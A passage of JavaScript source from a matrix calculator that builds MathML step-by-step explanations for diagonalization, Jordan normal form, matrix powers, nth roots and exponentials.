      return args != undefined && args[id] != undefined ? args[id] : undefined;
    })); //TODO: how to fix e.isExact() - ?

    if (i !== 0) {
      result += "<mo>" + (e.isExact() ? "=" : "&asymp;") + "</mo>";
    }

    result += e.toMathML(printOptions);
  }

  return result;
};

Expression.Details = function () {}; // TODO: optimize


Expression.Details._details = [];
Expression.Details.details = null; // https://stackoverflow.com/a/53357343/839199

var lowerBound = function (array, compare) {
  var start = 0;
  var end = array.length;

  while (start < end) {
    var middle = start + Math.floor((end - start) / 2);
    var value = array[middle];

    if (compare(value) <= 0) {
      end = middle;
    } else {
      start = middle + 1;
    }
  }

  return start;
};

var sortDetails = function () {
  if (Expression.Details.details == null) {
    Expression.Details._details.sort(function (a, b) {
      return a.type < b.type ? -1 : +1;
    });

    Expression.Details.details = Expression.Details._details;
  }
};

Expression.Details.getCallback = function (type) {
  sortDetails();
  var i = lowerBound(Expression.Details.details, function (a) {
    return type <= a.type ? -1 : +1;
  });

  if (i < Expression.Details.details.length) {
    if (Expression.Details.details[i].type === type) {
      return Expression.Details.details[i].callback;
    }
  }

  return undefined;
};

Expression.Details.add = function (data) {
  var x = {
    type: data.type,
    i18n: data.i18n,
    minRows: data.minRows || 1,
    maxRows: data.maxRows || 1 / 0,
    priority: data.priority || 0,
    // the number comparision should work
    callback: data.callback
  };

  Expression.Details._details.push(x);

  Expression.Details.details = null; //?

  if (x.type !== "multiply" && x.type !== "add" && x.type !== "pow" && x.type !== "special-determinant") {
    ExpressionParser.addOperation(x.type, x.type === "expand-along-column" || x.type === "expand-along-row" || x.type === "obtain-zeros-in-column" || x.type === "obtain-zeros-in-row" || x.type === "polynomial-multiply" ? 2 : 1);
  }
};

Expression.Details.getAll = function (typePrefix, rows) {
  var result = [];
  sortDetails();

  for (var i = lowerBound(Expression.Details.details, function (a) {
    return typePrefix <= a.type ? -1 : +1;
  }); i < Expression.Details.details.length && Expression.Details.details[i].type.indexOf(typePrefix) === 0; i += 1) {
    var x = Expression.Details.details[i];

    if (x.type.indexOf(typePrefix) === 0) {
      if (rows >= x.minRows && rows <= x.maxRows) {
        if (rows <= 4 || rows >= 10) {
          // limit maxRows to reduce "de tricherie aux examens" and un-hiding them for large matrices (>=10x10) it seems unlikely that such examples will be on exams
          result.push(x);
        }
      }
    }
  }

  result.sort(function (a, b) {
    return b.priority - a.priority;
  });
  return result;
};

Expression.Details.add({
  type: "property-adjugate-of-multiplication",
  callback: function () {
    return "<math>" + Expression.p("adj(A*B)=adj(B)*adj(A)") + "</math>" + " " + i18n.adjugateMatrixPropertiesLink;
  }
});
Expression.Details.add({
  type: "property-determinant-of-multiplication",
  callback: function () {
    return "<math>" + Expression.p("det(A*B)=det(A)*det(B)") + "</math>" + " " + i18n.determinantPropertiesLink;
  }
});
Expression.Details.add({
  type: "property-inverse-of-multiplication",
  callback: function () {
    return "<math>" + Expression.p("(A*B)^-1=B^-1*A^1") + "</math>" + " " + i18n.inversePropertiesLink;
  }
});
Expression.Details.add({
  type: "property-transpose-of-multiplication",
  callback: function () {
    return "<math>" + Expression.p("(A*B)^T=B^T*A^T") + "</math>" + " " + i18n.transposePropertiesLink;
  }
});
Expression.Details.add({
  type: "steps-to-diagonalize",
  minRows: 2,
  callback: function (printOptions, matrix) {
    // TODO: move to details
    //TODO: details of determinant calculation, details of roots finding
    var html = "";
    html += "<ol>";
    var tmp = Expression.getEigenvaluesWithSteps(printOptions, matrix);
    var eigenvalues = tmp.eigenvalues;
    html += "<li>";
    html += tmp.html;
    html += "</li>"; // https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Algebraic_multiplicity

    if (eigenvalues.length !== matrix.cols()) {
      //TODO: show polynomial in html anyway
      //TODO: fix message
      html += "</ol>"; //TODO: fix
      //TODO: fix

      return html;
    }

    var tmp2 = Expression.getEigenvectorsWithSteps(printOptions, matrix, Expression.unique(eigenvalues));
    html += "<li>";
    html += tmp2.html;
    html += "</li>";
    var eigenvectors = tmp2.eigenvectors; //  html += "</ol>";

    if (eigenvectors.length !== matrix.cols()) {
      //TODO: show polynomial in html anyway
      html += "</ol>"; //TODO: fix
      //TODO: fix

      return html;
    }

    var results = Expression.diagonalize(matrix, eigenvalues, eigenvectors);
    var T = results.T;
    var L = results.L;
    var T_INVERSED = results.T_INVERSED;
    html += "<li>";
    html += "<ul>";
    html += "<li>";
    var eigenvaluesLinks = [];
    var uniqueEigenvalues = Expression.unique(eigenvalues);

    for (var i = 0; i < uniqueEigenvalues.length; i += 1) {
      var eigenvalue = uniqueEigenvalues[i];
      var multiplicity = eigenvalues.reduce(function (count, e) { return count + (e === eigenvalue ? 1 : 0); }, 0);

      for (var j = 0; j < multiplicity; j += 1) {
        eigenvaluesLinks.push("<a href=\"#" + printOptions.idPrefix + "-eigenvalue-" + (i + 1) + "\">" + "<math>" + Expression.p("Î»_" + (i + 1)) + "</math>" + "</a>");
      }
    }

    var listFormat = getListFormat();
    html += "<div>" + i18n.diagonalization.theDiagonalMatrixTheDiagonalEntriesAreTheEigenvalues.replace(/\$\{eigenvaluesLinks\}/g, listFormat.format(eigenvaluesLinks)) + "</div>";
    html += "<math>" + Expression.p("D=M", {
      M: new Expression.Matrix(L)
    }, printOptions) + "</math>";
    html += "</li>";
    html += "<li>";
    var eigenvectorsLinks = [];

    for (var i = 0; i < eigenvectors.length; i += 1) {
      eigenvectorsLinks.push("<a href=\"#" + printOptions.idPrefix + "-eigenvector-" + (i + 1) + "\">" + "<math>" + Expression.p("v_0", {
        v_0: new Expression.MatrixSymbol('v_' + (i + 1))
      }, printOptions) + "</math>" + "</a>");
    }

    html += "<div>" + i18n.diagonalization.theMatrixWithTheEigenvectorsAsItsColumns.replace(/\$\{eigenvectorsLinks\}/g, listFormat.format(eigenvectorsLinks)) + "</div>";
    html += "<math>" + Expression.p("P=M", {
      M: new Expression.Matrix(T)
    }, printOptions) + "</math>";
    html += "</li>";
    html += "<li>";
    html += "<math>" + Expression.p("P^-1=M", {
      M: new Expression.Matrix(T_INVERSED)
    }, printOptions) + "</math>";
    html += createDetailsSummary(printOptions.idPrefix, [{
      type: T.getDeterminantEventType("inverse").type,
      matrix: T.toString(),
      second: undefined
    }]);
    html += "</li>";
    html += "<li>";
    html += "<math>" + Expression.p("A=P*D*P^-1") + "</math>";
    html += " ";
    html += i18n.matrixDiagonalizationLink;
    html += "</li>";
    html += "</ul>";
    html += "</li>";
    html += "</ol>";
    return html;
  }
});
Expression.Details.add({
  type: "diagonalize",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var eigenvalues = Expression.getEigenvalues(matrix); //TODO: fix

    var detailsHTML = createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-diagonalize',
      matrix: matrix.toString(),
      second: undefined
    }]);

    if (eigenvalues.length !== matrix.cols()) {
      return "<div>" + i18n.diagonalization.notEnoughRationalEigenvalues + "</div>" + detailsHTML;
    }

    var eigenvectors = Expression.getEigenvectors(matrix, eigenvalues);

    if (eigenvectors.filter(function (v) { return v != null; }).length !== matrix.cols()) {
      // The matrix is not diagonalizable, because it does not have {n} linearly independent eigenvectors.
      var message = i18n.diagonalization.notDiagonalizable.replace(/\$\{n\}/g, matrix.cols()); //!2019-04-18

      message += " " + "<small>" + i18n.JordanDecomposition.tryToFindJordanNormalForm.replace(/\*([^\*]+)\*/g, '<a href="#Jordan-decomposition(' + matrix.toString() + ')">$1</a>') + "</small>"; //!

      return "<div>" + message + "</div>" + detailsHTML;
    }

    var results = Expression.diagonalize(matrix, eigenvalues, eigenvectors); //var detailsHTML = "<details open=\"open\"><summary>" + i18n.misc.summaryLabel + "</summary><div class=\"indented\">" + html + "</div></details>";

    var resultHTML = "<math>" + new Expression.Matrix(matrix).toMathML(printOptions) + "<mo>" + (results.L.isExact() ? "=" : "&asymp;") + "</mo>" + "<mrow>" + new Expression.Matrix(results.T).toMathML(printOptions) + "<mo>&sdot;</mo>" + new Expression.Matrix(results.L).toMathML(printOptions) + "<mo>&sdot;</mo>" + new Expression.Matrix(results.T_INVERSED).toMathML(printOptions) + "</mrow>" + "</math>"; //result = results.T;

    return resultHTML + detailsHTML;
  }
});

function getListFormat() {
  var listFormat = typeof Intl !== 'undefined' && Intl.ListFormat != null ? new Intl.ListFormat([]) : {
    format: function (array) {
      return array.join(', ');
    }
  };
  return listFormat;
} //!2018-10-03


Expression.Details.add({
  type: "Jordan-decomposition",
  minRows: 2,
  //i18n: function () {
  //  return i18n.vectors.JordanDecomposition;//use cases -?
  //},
  callback: function (printOptions, matrix) {
    var tmp = Expression.getEigenvaluesWithSteps(printOptions, matrix);
    var eigenvalues = tmp.eigenvalues;

    if (eigenvalues.length !== matrix.cols()) {
      //TODO: allow complex roots
      //TODO: show polynomial in html anyway
      //TODO: fix message
      var html = undefined; //!

      html = tmp.html;
      var detailsHTML = "<details open=\"open\"><summary>" + i18n.misc.summaryLabel + "</summary><div class=\"indented\">" + html + "</div></details>";
      return "<div>" + i18n.diagonalization.notEnoughRationalEigenvalues + "</div>" + detailsHTML;
    } //var results = Expression.getFormaDeJordan(matrix, eigenvalues);
    //TODO: solution steps
    //TODO: merge with `Expression.getFormaDeJordan`
    //TODO: i18n
    //TODO: hide <details>, compute on demand
    //TODO: better details (links to vectors, subdetails for solution of systems)


    function matrixFromBlocks(blocks) {
      var start = 0;
      var J = Matrix.Zero(n, n);

      for (var i = 0; i < blocks.length; i += 1) {
        var b = blocks[i];
        J = J.map(function (e, i, j) {
          if (i >= start && i < start + b.size) {
            return i === j ? b.eigenvalue : i !== start + b.size - 1 && j === i + 1 ? Expression.ONE : Expression.ZERO;
          }

          return e;
        });
        start += b.size;
      }

      return J;
    }

    function isSolution(coefficientMatrix, vector) {
      var f = coefficientMatrix.multiply(vector);
      return f.eql(Matrix.Zero(f.rows(), 1));
    }

    function isLinearlyIndependentSet(basis, vectors) {
      // https://math.stackexchange.com/questions/412563/determine-if-vectors-are-linearly-independent
      return Matrix.fromVectors(basis.concat(vectors)).rank() === basis.length + vectors.length;
    }

    var containerId = printOptions.idPrefix + "-" + Expression.id();
    var links = [];
    var basis = [];
    var blocks = [];
    var A = matrix;
    var n = A.cols();
    var html = '';
    var listFormat = getListFormat();
    html += '<h3>' + i18n.JordanDecomposition.findAMatrixInJordanNormalFormSimilarToOriginal + ' ' + i18n.JordanDecompositionLink + '</h3>';
    html += '<ol>';
    html += '<li>';
    html += '<h4>' + i18n.JordanDecomposition.solveTheCharacteristicEquationForEigenvaluesAndTheirAlgebraicMultiplicities + '</h4>';
    html += tmp.html;
    html += '</li>';
    html += '<li>';
    html += '<h4>' + i18n.JordanDecomposition.findLinearlyIndependentGeneralizedEigenvectorsForEveryEigenvalue + '</h4>';
    html += '<ol>';
    var uniqueEigenvalues = Expression.unique(eigenvalues);

    for (var i = 0; i < uniqueEigenvalues.length; i += 1) {
      html += '<li>';
      var basisCorrespondingToTheEigenvalue = [];
      var eigenvalue = uniqueEigenvalues[i];
      var algebraicMultiplicity = eigenvalues.reduce(function (count, e) { return count + (e === eigenvalue ? 1 : 0); }, 0);
      var B = A.subtract(Matrix.I(n).scale(eigenvalue));
      html += '<h5>';
      html += i18n.JordanDecomposition.eigenvalue + ' ' + '<math>' + Expression.p('Î»_' + (i + 1) + '=v', {
        v: eigenvalue
      }, printOptions) + '</math>' + ', ' + i18n.JordanDecomposition.algebraicMultiplicity + ' ' + '<math>' + Expression.p('Î¼_' + (i + 1) + '=' + algebraicMultiplicity) + '</math>';
      html += '</h5>';
      html += '<p>' + i18n.JordanDecomposition.determineTheMaximalRankOfGeneralizedEigenvectors + '</p>';
      var m = 0;
      html += '<ul>';

      do {
        m += 1;
        html += '<li>';
        var rank = B.pow(m).rank();
        html += '<math>' + Expression.p('rank(A-l*I)**' + m + '=' + rank, {
          A: new Expression.Matrix(matrix),
          l: eigenvalue
        }, printOptions) + '</math>';
        html += '</li>';
      } while (B.pow(m).rank() > n - algebraicMultiplicity);

      html += '</ul>';
      m += 1;
      html += '<p>' + i18n.JordanDecomposition.determineEachJordanChain + '</p>';
      html += '<ol>';

      while (--m >= 1) {
        html += '<li>';
        html += i18n.JordanDecomposition.findSolutionsOfX.replace(/\$\{X\}/g, '<math>' + Expression.p('(A-l*I)**' + m + '*X=0', {
          A: new Expression.Matrix(matrix),
          l: eigenvalue
        }, printOptions) + '</math>');
        var solutionSet = Expression.getSolutionSet(B.pow(m));
        html += '<div>';
        html += i18n.JordanDecomposition.aBasisForTheSolutionSet + ' ';
        html += '<math>';
        html += '<mrow>';
        html += '<mo stretchy="false">{</mo>';
        html += solutionSet.length !== 1 ? '<mrow>' : '';

        for (var j = 0; j < solutionSet.length; j += 1) {
          var solution = solutionSet[j];

          if (j !== 0) {
            html += '<mo>,</mo>';
          }

          html += new Expression.Matrix(solution).toMathML(printOptions);
        }

        html += solutionSet.length !== 1 ? '</mrow>' : '';
        html += '<mo stretchy="false">}</mo>';
        html += '</mrow>';
        html += '</math>';
        html += '</div>';
        html += '<ol>';

        for (var j = 0; j < solutionSet.length; j += 1) {
          var solution = solutionSet[j];
          html += '<li>';
          html += '<h6>';
          html += '<math>' + Expression.p('x_' + (j + 1) + '=v', {
            v: new Expression.Matrix(solution)
          }, printOptions) + '</math>';
          html += '</h6>';

          if (!isSolution(B.pow(m - 1), solution)) {
            //TODO: "link" to m/"highlight" of m
            html += '<p>' + '<math>' + Expression.p('(A-l*I)**(' + m + '-1)*X', {
              A: new Expression.Matrix(matrix),
              l: eigenvalue
            }, printOptions) + '<mo>&ne;</mo>' + Expression.p(0) + '</math>' + ' &rarr; ' + i18n.JordanDecomposition.itIsAGeneralizedEigenvector + '</p>';
            var chain = [];
            chain.push(solution);
            html += '<p>' + i18n.JordanDecomposition.generateAJordanChainForThisGeneralizedEigenvector + '</p>';
            var chainHtml = '';
            chainHtml += '<ol>';
            chainHtml += '<li>';
            chainHtml += '<math>' + Expression.p('v_1=S', {
              S: new Expression.Matrix(solution)
            }, printOptions) + '</math>';
            chainHtml += '</li>';
            var s = solution;

            for (var k = 1; k < m; k += 1) {
              var previous = s;
              s = B.multiply(s).col(0);
              chain.push(s);
              chainHtml += '<li>';
              chainHtml += '<math>' + Expression.p('v_' + (k + 1) + '=(A-l*I)*S=X', {
                A: new Expression.Matrix(matrix),
                l: eigenvalue,
                S: new Expression.Matrix(previous),
                X: new Expression.Matrix(s)
              }, printOptions) + '</math>';
              chainHtml += '</li>';
            }

            chainHtml += '</ol>';
            chain.reverse();

            if (isLinearlyIndependentSet(basisCorrespondingToTheEigenvalue, chain)) {
              var id = containerId + '-' + (blocks.length + 1);
              html += '<table role="presentation" class="anchor-table anchor" id="' + id + '">';
              html += '<tr>';
              html += '<td>';
              html += chainHtml;
              html += '</td>';
              html += '<td>';
              html += '(' + localeString(blocks.length + 1) + ')';
              html += '</td>';
              html += '</tr>';
              html += '</table>';
              links.push('<a href="#' + id + '">(' + localeString(blocks.length + 1) + ')</a>');
              basis = basis.concat(chain);
              basisCorrespondingToTheEigenvalue = basisCorrespondingToTheEigenvalue.concat(chain);
              blocks.push({
                size: m,
                eigenvalue: eigenvalue
              });
            } else {
              html += chainHtml;
            }
          } else {
            //TODO: ? identityMatrixDenotation
            //TODO: 1*I - do not use invisible times here (?)
            html += '<p>' + '<math>' + Expression.p('(A-l*I)**(' + m + '-1)*X=0', {
              A: new Expression.Matrix(matrix),
              l: eigenvalue
            }, printOptions) + '</math>' + ' &rarr; ' + i18n.JordanDecomposition.itIsNotAGeneralizedEigenvector + '</p>';
          }

          html += '</li>';
        }

        html += '</ol>';
        html += '</li>';
      }

      html += '</ol>';
      html += '<p>' + i18n.JordanDecomposition.theJordanChainsMakeBasis.replace(/\$\{links\}/g, listFormat.format(links.slice(-basisCorrespondingToTheEigenvalue.length))) + '</p>';
      html += '</li>';
    }

    html += '</ol>';
    html += '</li>';
    html += '<li>';
    var J = matrixFromBlocks(blocks);
    var P = Matrix.fromVectors(basis);
    var P_INVERSED = P.isExact() ? P.inverse() : Expression._getInverse(A, eigenvalues, P);
    html += '<p>' + i18n.JordanDecomposition.generalizedModalMatrix.replace(/\$\{links\}/g, listFormat.format(links)) + '</p>';
    html += '<math>' + Expression.p('M=S', {
      S: new Expression.Matrix(P)
    }, printOptions) + '</math>';
    html += '<p>' + i18n.JordanDecomposition.JordanMatrix + '</p>';
    html += '<math>' + Expression.p('J=S', {
      S: new Expression.Matrix(J)
    }, printOptions) + '</math>';
    html += '</li>';
    html += '</ol>'; //TODO: solution steps
    //var html = tmp.html;
    //html += "<div>...</div>";
    //html += "<div>" + i18n.JordanDecompositionLink + "</div>";

    var detailsHTML = "<details open=\"open\"><summary>" + i18n.misc.summaryLabel + "</summary><div class=\"indented\">" + html + "</div></details>";
    return "<math>" + new Expression.Matrix(matrix).toMathML(printOptions) + "<mo>" + (J.isExact() ? "=" : "&asymp;") + "</mo>" + "<mrow>" + new Expression.Matrix(P).toMathML(printOptions) + "<mo>&sdot;</mo>" + new Expression.Matrix(J).toMathML(printOptions) + "<mo>&sdot;</mo>" + new Expression.Matrix(P_INVERSED).toMathML(printOptions) + "</mrow>" + "</math>" + detailsHTML;
  }
}); //!

function powUsingTransformationsHelper(x) {
  var pm1 = "<msup><mi>P</mi>" + Expression.ONE.negate().toMathML() + "</msup>";
  return "<munder accentunder=\"true\">" + "<munder accentunder=\"true\">" + "<mrow>" + "<mi>P</mi>" + "<mo>&sdot;</mo>" + x + "<mo>&sdot;</mo>" + "<menclose notation=\"updiagonalstrike\">" + pm1 + "</menclose>" + "<mo>&sdot;</mo>" + "<menclose notation=\"updiagonalstrike\">" + "<mi>P</mi>" + "</menclose>" + "<mo>&sdot;</mo>" + x + "<mo>&sdot;</mo>" + "<menclose notation=\"updiagonalstrike\">" + pm1 + "</menclose>" + "<mo>&sdot;</mo><mi>&hellip;</mi><mo>&sdot;</mo>" + "<menclose notation=\"updiagonalstrike\">" + "<mi>P</mi>" + "</menclose>" + "<mo>&sdot;</mo>" + x + "<mo>&sdot;</mo>" + pm1 + "</mrow>" + "<mo stretchy=\"true\">&UnderBrace;</mo>" + "</munder>" + "<mi>n</mi>" + "</munder>";
}

function powUsingTransformations(N) {
  return "<math>" + Expression.p("A^n") + "<mo>=</mo>" + Expression.p("(P*" + N + "*P^-1)^n") + "<mo>=</mo>" + powUsingTransformationsHelper(Expression.p(N)) + "<mo>=</mo>" + Expression.p("P*" + N + "^n*P^-1") + "</math>";
}

function nthRootUsingTransformations(N) {
  return "<math>" + powUsingTransformationsHelper(Expression.p(N + "**(1/n)")) + "<mo>=</mo>" + Expression.p("P*" + N + "*P^-1") + "<mo>=</mo>" + Expression.p("A") + "</math>";
}

Expression.Details.add({
  type: "pow-using-diagonalization",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = '';
    html += '<div>';
    html += i18n.misc.powUsingDiagonalizationIntro;
    html += '</div>';
    html += '<div>';
    html += powUsingTransformations("D") + " " + i18n.powUsingDiagonalizationLink;
    html += '</div>';
    return html;
  }
}); //!new

Expression.Details.add({
  type: "pow-using-Jordan-normal-form",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = ''; //TODO:...

    html += '<div>';
    html += i18n.misc.powUsingJordanNormalFormIntro;
    html += '</div>';
    html += '<div>';
    html += powUsingTransformations("J") + " " + i18n.powUsingJordanNormalFormLink;
    html += '</div>';
    var eigenvalues = Expression.getEigenvalues(matrix);
    var J = Expression.getFormaDeJordan(matrix, eigenvalues).J;
    html += '<p>' + i18n.misc.powOfJordanMatrix + '</p>'; //html += Expression.Details.getCallback('Jordan-matrix-pow')(printOptions, matrix);

    html += Expression.Details.getCallback('DpN-matrix-pow')(printOptions, J);
    return html;
  }
});
Expression.Details.add({
  type: "DpN-matrix-pow",
  i18n: function () {
    //return i18n.matrixExponentiation;
    return "exponentiation";
  },
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = ''; // Ð—Ð°Ð¼ÐµÑ‚Ð¸Ð¼, Ñ‡Ñ‚Ð¾ A = D + N, Ð³Ð´Ðµ D - Ð´Ð¸Ð°Ð³Ð¾Ð½Ð°Ð»ÑŒÐ½Ð°Ñ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ð°, Ð° N - Ð½Ð¸Ð»ÑŒÐ¿Ð¾Ñ‚ÐµÐ½Ñ‚Ð½Ð°, Ñ‚.Ðº. N**n = 0.
    // Ð¢Ð°ÐºÐ¶Ðµ, Ð·Ð°Ð¼ÐµÑ‚Ð¸Ð¼, Ñ‡Ñ‚Ð¾ D*N=N*D.
    // Ð¢Ð¾Ð³Ð´Ð° A**n=(D+N)**n=[binomial expansion] = ...
    //TODO: ...

    html += '<p>' + i18n.dpnMatrixPow.define + '</p>';
    var D = new Expression.Matrix(matrix.map(function (e, i, j) {
      return i === j ? e : Expression.ZERO;
    }));
    var N = new Expression.Matrix(matrix.map(function (e, i, j) {
      return i !== j ? e : Expression.ZERO;
    }));

    if (!N.matrix.isNilpotent()) {
      throw new RangeError();
    } //TODO: share ?


    var index = 1;

    while (!N.matrix.pow(index).eql(Matrix.Zero(N.matrix.cols(), N.matrix.cols()))) {
      if (index >= N.matrix.cols()) {
        throw new TypeError('assertion');
      }

      index += 1;
    }

    html += '<math>' + Expression.p('D=X', {
      X: D
    }, printOptions) + '</math>';
    html += ', '; //?

    html += '<math>' + Expression.p('N=X', {
      X: N
    }, printOptions) + '</math>';
    html += '<p>' + i18n.dpnMatrixPow.soThat.replaceAll('${(D+N)**n}', '<math>' + Expression.p('(D+N)**n') + '</math>') + '</p>';
    html += '<ul>';
    html += '<li>' + '<math>' + Expression.p('D*N=N*D') + '</math>' + ' â€” ' + i18n.dpnMatrixPow.DAndNCommute.replace(/\$\{D\}/g, '<math>' + Expression.p('D') + '</math>').replace(/\$\{N\}/g, '<math>' + Expression.p('N') + '</math>') + '</li>';
    html += '<li>' + '<math>' + Expression.p('N**' + index + '=0') + '</math>' + '</li>'; //TODO: say something about nilpotent of a triangular with zeroes on diagonal

    html += '</ul>';
    html += '<p>' + i18n.dpnMatrixPow.whichEnables + '</p>';
    html += '<math>';
    html += Expression.p('(D+N)**n');
    html += '<mo>=</mo>';
    html += '<mrow>';
    html += '<munderover accentunder="false" accent="false"><mo>âˆ‘</mo><mrow><mi>k</mi><mo>=</mo>' + Expression.p(0) + '</mrow><mi>n</mi></munderover>';
    html += '<mrow>';
    html += '<mrow><mo>(</mo><mfrac linethickness="0"><mi>n</mi><mi>k</mi></mfrac><mo>)</mo></mrow>';
    html += '<mo>&it;</mo>';
    html += Expression.p('D**(n-k)*N**k').replace(/&times;/g, '&it;');
    html += '</mrow>';
    html += '</mrow>';
    html += '<mo>=</mo>';
    var s = '';

    for (var k = 0; k < index; k += 1) {
      s += s !== '' ? '+' : '';
      var bc = '';

      for (var i = 0; i < k; i += 1) {
        bc += i === 0 ? 'n' : '(n-' + i + ')';
      }

      var f = Expression.Integer.fromNumber(k).factorial().toBigInt();
      s += k !== 0 ? k !== 1 ? bc + '/' + f + '*' + 'D**(n-' + k + ')*N**' + k : 'n' + '*' + 'D**(n-1)*N' : 'D**n';
    }

    html += Expression.p(s).replace(/&times;/g, '&it;');
    html += '</math>';
    html += ' ';
    html += '<a href="https://math.stackexchange.com/questions/2079950/compute-the-n-th-power-of-triangular-3-times3-matrix/2079981#2079981">(*)</a>';
    return html;
  }
});

var outputJordanMatrix = function (n, block1Size) {
  var html = '';
  html += '<mrow>';
  html += '<mo>(</mo>';
  html += '<mtable rowspacing="0ex">';

  for (var i = 0; i < n; i += 1) {
    html += '<mtr>';

    for (var j = 0; j < n; j += 1) {
      html += '<mtd>';
      var c = undefined;

      if (i === j) {
        c = j < block1Size ? 'Î»_1' : 'Î»_2';
      } else if (j === i + 1) {
        c = j !== block1Size ? 1 : 0;
      } else {
        c = 0;
      }

      html += Expression.p(c);
      html += '</mtd>';
    }

    html += '</mtr>';
  }

  html += '</mtable>';
  html += '<mo>)</mo>';
  html += '</mrow>';
  return html;
};
/*
//TODO: remove - ?
Expression.Details.add({
  type: "Jordan-matrix-pow",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = '';

    html += i18n.misc.powOfJordanMatrix;
    html += '<div>';
    html += '<math>';

    // thanks to http://fred-wang.github.io/TeXZilla/
    html += '<msup>';
    html += outputJordanMatrix(5, 3);
    html += '<mi>n</mi>';
    html += '</msup>';

    html += '<mo>=</mo>';

    html += '<mrow>';
    html += '<mo>(</mo>';
    html += '<mtable rowspacing="0ex">';
    for (var i = 0; i < 5; i += 1) {
      html += '<mtr>';
      for (var j = 0; j < 5; j += 1) {
        html += '<mtd>';
        var c = i < 3 ? 1 : 2; // lambda
        if (i === j) {
          html += '<msup>' + Expression.p('Î»_' + c) + '<mi>n</mi></msup>';
        } else if (i < j && (j < 3 || i >= 3)) {
          var m = j < 3 ? j - i : j - 3;
          var binomialCoefficient = '<mrow><mo>(</mo><mfrac linethickness="0"><mi>n</mi>' + Expression.p(m) + '</mfrac><mo>)</mo></mrow>';
          html += binomialCoefficient;
          html += '<mo>&it;</mo>';
          html += '<msup>' + Expression.p('Î»_' + c) + '<mrow><mi>n</mi><mo>&minus;</mo>' + Expression.p(m) + '</mrow></msup>';
        } else {
          html += Expression.p(0);
        }
        html += '</mtd>';
      }
      html += '</mtr>';
    }
    html += '</mtable>';
    html += '<mo>)</mo>';
    html += '</mrow>';

    html += '</math>';
    html += ' ';
    html += i18n.blockOfJordanPowerFormulaLink;
    html += '</div>';
    return html;
  }
});

*/


Expression.Details.add({
  type: "Jordan-matrix-nth-root",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = '';
    html += i18n.misc.nthRootOfJordanMatrix;
    html += '<div>';
    html += '<math>'; // thanks to http://fred-wang.github.io/TeXZilla/

    html += '<msup>';
    html += outputJordanMatrix(6, 4);
    html += '<mfrac>' + Expression.p(1) + '<mi>n</mi></mfrac>'; //!

    html += '</msup>';
    html += '<mo>=</mo>';
    html += '<mrow>';
    html += '<mo>(</mo>';
    html += '<mtable rowspacing="0ex">';

    for (var i = 0; i < 6; i += 1) {
      html += '<mtr>';

      for (var j = 0; j < 6; j += 1) {
        html += '<mtd>';
        var c = i < 4 ? 1 : 2; // lambda

        if (i === j) {
          html += '<msup><mi>Î»</mi><mrow><mo>(</mo><mrow>' + Expression.p(1) + '<mo>&#x2215;</mo><mi>n</mi></mrow><mo>)</mo></mrow></msup>'; //!
        } else if (i < j && (j < 4 || i >= 4)) {
          var m = j < 4 ? j - i : j - 4; // (1-n)(1-2n)(1-3n)/(4!*n**4) * 1/Î»**m * Î»**(1/n)

          var s = '';

          if (m > 1) {
            for (var k = 1; k < m; k += 1) {
              s += '(1-' + (k === 1 ? '' : k) + 'n)';
            }

            s += '/(' + m + '!' + 'n**' + m + ')';
          } else {
            s += '1/n';
          }

          s += '*(Î»**(1/n)/Î»' + (m !== 1 ? '**' + m : '') + ')';
          html += Expression.p(s).replace(/&times;/g, '&it;'); //TODO:
        } else {
          html += Expression.p(0);
        }

        html += '</mtd>';
      }

      html += '</mtr>';
    }

    html += '</mtable>';
    html += '<mo>)</mo>';
    html += '</mrow>';
    html += '</math>';
    html += ' ';
    html += i18n.blockOfJordanPowerFormulaLink;
    html += '</div>';
    return html;
  }
});
Expression.Details.add({
  type: "nth-root-using-diagonalization",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = '';
    html += '<div>' + i18n.misc.ifXisARootOfAMatrixInDiagonalFormThen.replaceAll('${D^(1/n)}', Expression.p('D^(1/n)')) + '</div>';
    html += nthRootUsingTransformations("D") + " " + i18n.nthRootUsingDiagonalizationLink;
    html += '<div>' + i18n.misc.thisMeansThatXIsANthRootOfTheMatrix.replaceAll('${P*J^(1/n)*P^-1}', Expression.p('P*J^(1/n)*P^-1')).replace(/<mi>J<\/mi>/g, '<mi>D</mi>') + '</div>';
    return html;
  }
});
Expression.Details.add({
  type: "nth-root-using-Jordan-normal-form",
  minRows: 2,
  callback: function (printOptions, matrix) {
    //TODO: change the link (?), tests - ?
    //TODO: some text explaining, that J - is a matrix in Jordan normal form, P - is a Generalized Nodal Matrix
    var html = "";
    html += '<div>' + i18n.misc.ifXisARootOfAMatrixInJordanNormalFormThen.replaceAll('${J^(1/n)}', Expression.p('J^(1/n)')) + '</div>';
    html += nthRootUsingTransformations("J") + " " + (i18n.nthRootUsingJordanNormalFormLink || i18n.nthRootUsingDiagonalizationLink);
    html += '<div>' + i18n.misc.thisMeansThatXIsANthRootOfTheMatrix.replaceAll('${P*J^(1/n)*P^-1}', Expression.p('P*J^(1/n)*P^-1')) + '</div>'; // The nth-root of a Jordan normal form can be found by using the formula:
    //TODO: formula

    html += Expression.Details.getCallback('Jordan-matrix-nth-root')(printOptions, matrix);
    return html;
  }
});
Expression.Details.add({
  type: "exponential-using-Jordan-canonical-form",
  minRows: 2,
  i18n: function () {
    return i18n.vectors.matrixExponential; //use cases -?
  },
  callback: function (printOptions, matrix) {
    //TODO: when the matrix is already diagonal, when the matrix is a [projection matrix](https://en.wikipedia.org/wiki/Matrix_exponential#Projection_case)
    //  Expression.Details.getCallback("exponential-using-Jordan-canonical-form")({}, RPN("{{0,1,0},{0,1,0},{0,0,0}}").matrix);
    var diagonalCase = function (name, expD) {
      var html = '';
      html += '<h4>' + i18n.exponential.findTheExponentialOfTheDiagonalMatrixD.replace(/\$\{D\}/g, '<math>' + Expression.p(name) + '</math>') + '</h4>';
      html += '<div>';
      html += i18n.exponential.exponentialOfDiagonalMatrix;
      html += '</div>';
      html += '<div>';
      html += '<math>' + Expression.p('e**' + name + '=M', {
        M: expD
      }, printOptions) + '</math>';
      html += '</div>';
      return html;
    };

    var nilpotentCase = function (N, expN) {
      var html = '';
